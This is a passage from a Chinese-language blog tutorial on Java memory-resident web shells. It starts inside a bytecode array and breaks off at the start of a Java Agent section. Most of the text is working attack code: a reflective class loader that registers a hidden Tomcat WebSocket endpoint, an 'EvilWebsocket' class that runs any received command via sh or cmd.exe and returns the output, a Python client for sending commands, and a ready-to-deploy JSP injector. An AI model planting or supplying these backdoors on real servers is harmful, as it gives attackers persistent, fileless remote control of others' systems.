<span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">4</span>, <span class="number">61</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">78</span>, <span class="number">45</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">45</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">28</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">13</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">5</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">17</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">19</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">42</span>, -<span class="number">76</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, <span class="number">44</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, -<span class="number">112</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">42</span>, <span class="number">43</span>, -<span class="number">75</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">43</span>, <span class="number">42</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">43</span>, -<span class="number">64</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">28</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, -<span class="number">118</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">6</span>, <span class="number">9</span>&#125;;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                clazz = (Class) method.invoke(cl, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">                <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(clazz, urlPath).build();</span><br><span class="line">                <span class="type">WsServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> == container.findMapping(urlPath)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        container.addEndpoint(configEndpoint);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (DeploymentException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EvilWebsocket类，主要是想拿到它的字节码，然后加载进JVM中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.EndpointConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.MessageHandler;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            session.getBasicRemote().sendText(output);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后可以使用以下python代码作为一个简单的websocket客户端执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(<span class="string">&quot;ws://127.0.0.1:8080/evilWebsocket&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command != <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        ws.send(command)</span><br><span class="line">        result = ws.recv()</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ws.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行结果：</p><p><a href="https://pic.imgdb.cn/item/64d26fe21ddac507cc0a3c5c.jpg" title="image-20230804112541811" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fe21ddac507cc0a3c5c.jpg" alt="image-20230804112541811"></a></p><h4 id="jsp注入Tomcat-Websocket-型内存马"><a href="#jsp注入Tomcat-Websocket-型内存马" class="headerlink" title="jsp注入Tomcat-Websocket 型内存马"></a>jsp注入Tomcat-Websocket 型内存马</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                session.getBasicRemote().sendText(output);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evilWebsocket&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(EvilWebsocket.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        container.addEndpoint(configEndpoint);</span><br><span class="line">        servletContext.setAttribute(path,path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Java-Agent-型内存马"><a href="#Java-Agent-型内存马" class="headerlink" title="Java-Agent 型内存马"></a>Java-Agent 型内存马</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法。Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意代码添加进去。</p><p>Java Agent 支持两种方式进行加载：</p><ol><li><p>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</p></li><li><p>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</p></li></ol><p>实现 premain 方法在RASP中必用到，但是因为通过premain注入内存马过于鸡肋，需要重新启动Web服务，制定-javaagent，这里就不再介绍。先写一个简单的实现了agentmain 方法的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 